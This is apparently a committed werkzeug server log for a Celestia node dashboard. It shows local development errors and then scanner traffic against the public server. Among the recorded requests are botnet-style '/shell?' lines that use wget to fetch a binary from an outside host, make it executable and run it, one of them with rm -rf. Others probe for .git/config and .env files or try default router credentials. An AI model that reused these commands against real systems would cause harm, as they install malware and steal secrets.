+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:47] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:47] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:47] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:13:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:03] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:03] "[33mGET /site/assets/img/celestia-logo.svg HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:03] "[33mGET /site/assets/js/simple-notify.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:04] "[33mGET /site/assets/js/main.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.5.3.35:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:13] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:13] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:14] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:14] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:14] "GET /static/js/notify.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000018CA08C6390>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:16] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:17] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:17] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:17] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:17] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000018CA08D6A10>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:20] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:26] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:14:30] "[36mGET /static/img/celestia-logo.svg HTTP/1.1[0m" 304 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:00] "[33mGET /static/css/style.css HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:00] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:00] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:01] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:01] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000018CA08EB450>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:03] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.5.3.35:5000
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:07] "GET /static/css/styles.css HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:07] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:07] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:07] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001F1D369C990>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:09] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:37] "[36mGET /static/css/styles.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:37] "[36mGET /static/img/celestia-logo.svg HTTP/1.1[0m" 304 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:37] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:37] "[36mGET /static/js/notify.js HTTP/1.1[0m" 304 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001F1D36B2D10>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:15:40] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:02] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:02] "GET /static/css/styles.css HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:02] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:02] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:02] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:03] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ERROR:root:HTTPConnectionPool(host='127.0.0.1', port=26659): Max retries exceeded with url: /balance (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001F1D3699050>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+INFO:werkzeug:127.0.0.1 - - [11/Apr/2023 15:37:05] "[35m[1mGET /node_status HTTP/1.1[0m" 500 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://46.38.236.126:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:32] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:33] "GET /static/css/styles.css HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:33] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:33] "GET /static/js/notify.js HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:33] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "GET /balance HTTP/1.1" 200 36
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:34] "GET /node_status HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "POST /submit_pfb HTTP/1.1" 200 None
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:33:44] "POST /submit_pfb HTTP/1.1" 200 -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://46.38.236.126:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://46.38.236.126:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:31] "[36mGET /static/img/celestia-logo.svg HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:31] "[36mGET /static/css/styles.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:31] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:39] "[36mGET /static/css/styles.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:39] "[36mGET /static/img/celestia-logo.svg HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:40] "[36mGET /static/js/main.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:40] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "GET /balance HTTP/1.1" 200 36
+INFO:werkzeug:14.186.181.228 - - [17/Apr/2023 17:37:41] "GET /node_status HTTP/1.1" 200 -
+INFO:werkzeug:202.164.136.208 - - [17/Apr/2023 18:30:27] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.131.18.201 - - [17/Apr/2023 19:35:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:159.223.12.224 - - [17/Apr/2023 20:01:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:36.40.72.66 - - [17/Apr/2023 20:22:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:34.79.22.117 - - [17/Apr/2023 20:48:45] "[33mGET /pub/god/ HTTP/1.1[0m" 404 -
+ERROR:werkzeug:167.71.102.95 - - [17/Apr/2023 20:53:28] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8')
+INFO:werkzeug:167.71.102.95 - - [17/Apr/2023 20:53:28] "[35m[1m 8 ÙF·~x     [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:66.240.205.34 - - [17/Apr/2023 21:01:10] code 400, message Bad request version ('ô')
+INFO:werkzeug:66.240.205.34 - - [17/Apr/2023 21:01:10] "[35m[1mH   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:39.108.138.206 - - [17/Apr/2023 21:18:53] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+INFO:werkzeug:39.108.138.206 - - [17/Apr/2023 21:18:53] "[35m[1mGET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:185.224.128.106 - - [17/Apr/2023 22:37:16] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [17/Apr/2023 23:12:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:199.167.138.128 - - [17/Apr/2023 23:15:18] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.145.57 - - [18/Apr/2023 00:28:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.94.145.57 - - [18/Apr/2023 00:28:54] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.94.145.57 - - [18/Apr/2023 00:28:54] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.145.57 - - [18/Apr/2023 00:28:54] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.94.145.57 - - [18/Apr/2023 00:28:54] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:50.202.219.148 - - [18/Apr/2023 00:51:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:223.240.101.111 - - [18/Apr/2023 01:24:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:128.14.209.162 - - [18/Apr/2023 01:32:10] "[33mGET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.88.66.237 - - [18/Apr/2023 02:04:26] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.153.207.12 - - [18/Apr/2023 02:25:03] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 02:38:21] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:107.170.254.17 - - [18/Apr/2023 02:48:06] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:107.170.254.17 - - [18/Apr/2023 02:48:06] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:35.153.207.12 - - [18/Apr/2023 03:13:10] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.153.207.12 - - [18/Apr/2023 03:13:11] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.56.252.212 - - [18/Apr/2023 03:14:10] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 03:48:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:49] "GET /static/css/styles.css HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:49] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:50] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:50] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:50] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "GET /balance HTTP/1.1" 200 36
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:10:50] "GET /node_status HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "POST /submit_pfb HTTP/1.1" 200 None
+INFO:werkzeug:14.186.181.228 - - [18/Apr/2023 04:11:02] "POST /submit_pfb HTTP/1.1" 200 -
+INFO:werkzeug:116.24.83.207 - - [18/Apr/2023 04:17:53] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0[0m" 404 -
+INFO:werkzeug:184.105.247.254 - - [18/Apr/2023 04:22:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:184.105.247.254 - - [18/Apr/2023 04:24:10] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:184.105.247.254 - - [18/Apr/2023 04:25:45] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:194.55.224.203 - - [18/Apr/2023 04:28:30] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 06:30:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:146.190.57.24 - - [18/Apr/2023 06:33:52] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:146.190.57.24 - - [18/Apr/2023 06:34:12] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:146.190.57.24 - - [18/Apr/2023 06:34:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:16.171.39.191 - - [18/Apr/2023 06:49:29] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:159.203.208.9 - - [18/Apr/2023 06:55:28] "[33mGET /ReportServer HTTP/1.1[0m" 404 -
+INFO:werkzeug:36.90.209.13 - - [18/Apr/2023 07:26:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:160.19.197.51 - - [18/Apr/2023 08:09:13] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:178.62.216.118 - - [18/Apr/2023 08:12:42] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:178.62.216.118 - - [18/Apr/2023 08:13:04] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:178.62.216.118 - - [18/Apr/2023 08:13:24] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.12.147.2 - - [18/Apr/2023 08:47:35] "GET http://azenv.net/ HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 08:52:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.118.53.194 - - [18/Apr/2023 09:28:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:205.210.31.231 - - [18/Apr/2023 09:35:50] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.235.24.100 - - [18/Apr/2023 10:04:57] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03xÂàvI¿\x17HÒ§tc\x11¦6Ç¢zÒ\x02\x95WÊçK¥\x82ûwi\x03!\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+INFO:werkzeug:198.235.24.100 - - [18/Apr/2023 10:04:57] "[35m[1m Ê  ÆxÂàvI¿HÒ§tc¦6Ç¢zÒWÊçK¥ûwi!  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:5.254.26.214 - - [18/Apr/2023 10:05:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:134.122.184.29 - - [18/Apr/2023 10:07:35] "[33mGET /donghuapian/baishe2qingshejieqi/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.209.135 - - [18/Apr/2023 10:07:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 10:39:59] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 11:05:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:194.55.224.203 - - [18/Apr/2023 11:11:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.32 - - [18/Apr/2023 12:26:32] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.12.147.2 - - [18/Apr/2023 13:19:37] "GET http://azenv.net/ HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 13:36:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.119 - - [18/Apr/2023 13:46:00] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.177 - - [18/Apr/2023 13:52:48] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:113.200.137.104 - - [18/Apr/2023 14:17:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:194.87.151.116 - - [18/Apr/2023 14:48:46] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:179.43.177.243 - - [18/Apr/2023 14:56:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 15:35:05] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:192.155.90.118 - - [18/Apr/2023 15:52:51] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:192.155.90.118 - - [18/Apr/2023 15:52:51] "[35m[1m   â9}4Iq31XÁa@;SCSù9LP4ù¡9ûÚ èY   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:192.155.88.231 - - [18/Apr/2023 16:03:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:81.207.70.129 - - [18/Apr/2023 16:07:02] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:46.117.166.141 - - [18/Apr/2023 16:44:04] "[33mGET /ws HTTP/1.1[0m" 404 -
+INFO:werkzeug:35.195.241.126 - - [18/Apr/2023 16:47:05] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:91.146.174.248 - - [18/Apr/2023 17:44:59] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:35.190.202.198 - - [18/Apr/2023 17:50:15] "[33mGET /pub/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:93.151.229.180 - - [18/Apr/2023 17:53:50] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:186.220.224.41 - - [18/Apr/2023 18:12:31] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:45.12.147.2 - - [18/Apr/2023 18:15:10] "GET http://azenv.net/ HTTP/1.1" 200 -
+INFO:werkzeug:45.79.172.21 - - [18/Apr/2023 18:15:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.180.143.189 - - [18/Apr/2023 18:23:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 18:30:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:162.243.148.16 - - [18/Apr/2023 18:46:51] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.140.31 - - [18/Apr/2023 19:20:56] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:106.178.141.31 - - [18/Apr/2023 19:28:25] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 19:30:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.178.190.82 - - [18/Apr/2023 19:45:35] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1[0m" 404 -
+INFO:werkzeug:66.240.236.109 - - [18/Apr/2023 20:07:55] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:180.149.125.168 - - [18/Apr/2023 20:13:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:140.246.136.252 - - [18/Apr/2023 20:22:17] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:3.237.25.154 - - [18/Apr/2023 21:02:28] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:3.237.25.154 - - [18/Apr/2023 21:02:28] "[35m[1m ê  æÑERí½¹©Ä}åQÄXëu8ÆbÆÄv®7¢D ¥.ù .§©é/ÊNQà.ÏÀLra<ÎÑhøß &À+À/À,À0Ì©Ì¨À	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:3.237.25.154 - - [18/Apr/2023 21:02:28] "[33mGET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [18/Apr/2023 21:22:49] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:64.227.97.195 - - [18/Apr/2023 21:44:29] code 400, message Bad request syntax ('\x00\x0e8ëL²öÅçðÔ\x00\x00\x00\x00\x00')
+INFO:werkzeug:64.227.97.195 - - [18/Apr/2023 21:44:29] "[35m[1m 8ëL²öÅçðÔ     [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[35m[1m {  w²ß«© ±W.¦úÂC,(íÝ@*}K7ó&MÀF  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8fp\x9bK`fq')
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[35m[1m {  wpK`fq[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03N{,¼jy§·¨·\x98\x89Lþ¢ßÜüË¨ï8&\x8d\x8eMÏ?\x15buä\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[35m[1m {  wN{,¼jy§·¨·Lþ¢ßÜüË¨ï8&MÏ?buä  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:142.93.226.56 - - [18/Apr/2023 23:09:21] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
